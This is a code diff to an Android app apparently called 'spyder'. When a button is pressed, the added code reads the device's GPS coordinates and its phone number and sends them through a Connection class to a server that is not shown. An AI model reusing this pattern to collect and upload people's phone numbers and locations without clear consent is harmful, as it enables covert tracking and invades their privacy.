@@ -1,13 +1,16 @@
 package com.zavgorodniy.spyder;
 
 import android.app.Activity;
+import android.content.Context;
 import android.os.Bundle;
+import android.telephony.TelephonyManager;
 import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
 
 import com.zavgorodniy.spyder.Locator.GPSTracker;
+import com.zavgorodniy.spyder.connection.Connection;
 
 public class MainActivity extends Activity {
 
@@ -16,6 +19,7 @@ public class MainActivity extends Activity {
     TextView tvPreviousLocation;
 
     GPSTracker gps;
+    Connection conn;
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -33,28 +37,38 @@ public class MainActivity extends Activity {
             public void onClick(View arg0) {
                 // create class object
                 gps = new GPSTracker(MainActivity.this);
+                conn = new Connection();
+
 
                 // check if GPS enabled
                 if(gps.canGetLocation()){
 
-                    double latitude = gps.getLatitude();
-                    double longitude = gps.getLongitude();
+                    String latitude = String.valueOf(gps.getLatitude());
+                    String longitude = String.valueOf(gps.getLongitude());
+                    String telNumber = phoneNumber();
+
+                    conn.sendData(telNumber, latitude, longitude);
 
                     String coordinates = tvCurrentLocation.getText().toString();
                     tvPreviousLocation.setText(coordinates);
                     coordinates = "Lat: " + latitude + "\nLong: " + longitude;
                     tvCurrentLocation.setText(coordinates);
 
-                    Toast.makeText(getApplicationContext(), "Your Location is - \n" + coordinates, Toast.LENGTH_LONG).show();
+                    Toast.makeText(getApplicationContext(), "Your Location is - \n" + coordinates +
+                            "\n" + telNumber, Toast.LENGTH_LONG).show();
                 } else {
                     // can't get location
-                    // GPS or Network is not enabled
-                    // Ask user to enable GPS/network in settings
-                    gps.showSettingsAlert();
+                    // GPS or Network is not enabled message
+                    Toast.makeText(getApplicationContext(), "Please, enable GPS or check connection to network", Toast.LENGTH_LONG).show();
                 }
-
             }
         });
+    }
+
+    public String phoneNumber() {
+        TelephonyManager tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        String mPhoneNumber = tMgr.getLine1Number();
+        return mPhoneNumber;
     }
 }
 
